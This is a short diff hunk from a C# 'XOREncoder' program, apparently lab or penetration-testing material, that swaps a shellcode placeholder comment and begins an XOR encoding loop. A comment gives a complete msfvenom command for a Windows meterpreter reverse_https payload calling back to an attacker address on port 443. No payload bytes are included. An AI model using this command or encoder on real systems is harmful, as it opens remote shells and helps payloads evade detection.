@@ -14,8 +14,8 @@ namespace XOREncoder
         {
             // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.55 LPORT=443 EXITFUNC=thread -f csharp -o met.cs
             byte[] buf = new byte[721] {
-                // INSERT MSFVENOM CODE HERE
-			};
+                // INSERT XOR'd CODE HERE
+            };
 
             byte[] encoded = new byte[buf.Length];
             for (int i = 0; i < buf.Length; i++)
